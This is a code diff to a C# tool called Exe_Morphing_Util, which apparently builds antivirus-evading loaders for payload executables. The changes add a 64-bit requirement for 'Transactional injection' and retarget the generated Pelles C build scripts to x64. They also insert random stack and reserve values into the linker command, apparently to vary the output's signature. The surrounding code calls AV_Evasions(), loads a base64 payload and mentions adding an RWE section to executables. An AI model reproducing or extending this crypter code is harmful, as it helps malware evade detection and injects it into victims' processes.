@@ -181,6 +181,14 @@ namespace Exe_Morphing_Util
                 MessageBox.Show("Error, no file loaded", "Error");
                 return;
             }
+            if(rbTransactional.Checked)
+            {
+                if(!is64bit(tbfilehere.Text))
+                {
+                    MessageBox.Show("Error, binary MUST be 64 bit or else it won't work with Transactional injection. Blame Microsoft.", "Error");
+                    return;
+                }
+            }
 
             bgw.RunWorkerAsync();
             
@@ -650,11 +658,15 @@ namespace Exe_Morphing_Util
             // B64_payload(Application.StartupPath + "\\builder\\res\\tempload.joe");
             // 
             AV_Evasions();
-            if (rbTransactional.Checked)
+            if (rbTransactional.Checked) // not sure if i want the transactional loader in makeloader() with a 64 bit check within, or have it be separate
             {
-                compile_transactional_launcher();
+                compile_transactional_launcher(); 
             }
-            MakeLoader();
+            else
+            {
+                MakeLoader();
+            }
+            
             Process.Start(Application.StartupPath + "\\output_dir\\");
             //AddToIAT(FLSTrick(), tbfilehere.Text);
             // now lets have some fun - modify the main exe, add a new section, mark it RWE, add code to it?
@@ -1189,15 +1201,15 @@ namespace Exe_Morphing_Util
             sw.WriteLine("color 17");
             sw.WriteLine("set PellesCDir=" + Application.StartupPath + "\\compiler");
             sw.WriteLine("set PATH=%PellesCDir%\\Bin;%PATH%");
-            sw.WriteLine("set INCLUDE=%PellesCDir%\\Include;%PellesCDir%\\Include\\Win;%INCLUDE%");
-            sw.WriteLine("set LIB=%PellesCDir%\\Lib;%PellesCDir%\\Lib\\Win;%LIB%");
+            sw.WriteLine("set INCLUDE=%PellesCDir%\\Include;%PellesCDir%\\Include\\Win64;%INCLUDE%");
+            sw.WriteLine("set LIB=%PellesCDir%\\Lib;%PellesCDir%\\Lib\\Win64;%LIB%");
 
             // compile -std:C11 -Tx86-coff -Os -Ox -Ob0 -fp:precise -W0 -Gz -Ze
-            sw.WriteLine(compilerexe + " -std:C11 -Tx86-coff -Os -Ox -Ob0 -fp:precise -W0 -Gz -Ze \"" + sourcepath + "\" -Fo\"" + objpath + "\""); // changed to no warnings. smaller code
+            sw.WriteLine(compilerexe + " -std:C11 -Tx64-coff -Ot -Ob1 -fp:precise -W1 -AAMD64 -Gr -Ze \"" + sourcepath + "\" -Fo\"" + objpath + "\""); // changed to no warnings. smaller code
                                                                                                                                                    // resources
             sw.WriteLine(rsrcexe + " \"" + rsrs1 + "\" -Fo\"" + rsrs2 + "\"");
             // link
-            sw.WriteLine(linkexe + " -subsystem:windows -machine:X86 -largeaddressaware " +
+            sw.WriteLine(linkexe + " -subsystem:windows -machine:x64 -largeaddressaware " +
                 "-base:0x10000 kernel32.lib user32.lib gdi32.lib comctl32.lib comdlg32.lib Rpcrt4.lib " +
                 "winmm.lib oleaut32.lib ole32.lib wbemuuid.lib Advapi32.lib -out:\"" + finalexe + "\" \"" + objpath + "\" \"" + rsrs2 + "\"");
             sw.WriteLine("\r\n");
@@ -1258,8 +1270,13 @@ namespace Exe_Morphing_Util
             string rsrs1 = Application.StartupPath + "\\builder\\payload.rc";
             string rsrs2 = Application.StartupPath + "\\builder\\payload.res";
             string finalexe = Application.StartupPath + "\\output_dir\\gogopowerrangers.exe";
-			
-			
+            Random xxx = new Random();
+            int stack = xxx.Next(1, 4096);
+            int reserve = xxx.Next(1, 8192);
+            string thestack, thereserve;
+            thestack = BitConverter.ToString(BitConverter.GetBytes(stack));
+            thereserve = BitConverter.ToString(BitConverter.GetBytes(reserve));
+            
             StreamWriter sw = new StreamWriter(Application.StartupPath + "\\builder\\buildit.bat");
             sw.WriteLine("@echo off");
             sw.WriteLine("color 17");
@@ -1274,6 +1291,7 @@ namespace Exe_Morphing_Util
             sw.WriteLine(rsrcexe + " \"" + rsrs1 + "\" -Fo\"" + rsrs2 + "\"");
 			// link
             sw.WriteLine(linkexe + " -subsystem:windows -machine:X86 -largeaddressaware " +
+                "-stack:0x" + thestack + ",0x" + thereserve + " " + // add rando value for the stack and reserve
                 "-base:0x10000 kernel32.lib user32.lib gdi32.lib comctl32.lib comdlg32.lib Rpcrt4.lib " +
                 "winmm.lib oleaut32.lib ole32.lib wbemuuid.lib Advapi32.lib -out:\"" + finalexe + "\" \"" + objpath + "\" \"" + rsrs2 + "\"");
             sw.WriteLine("\r\n");
@@ -1743,5 +1761,6 @@ namespace Exe_Morphing_Util
             text = text.Replace("__randval__", rnd.Next(1, 255).ToString());
             File.WriteAllText("test.txt", text);
         }
+       
     }
 }
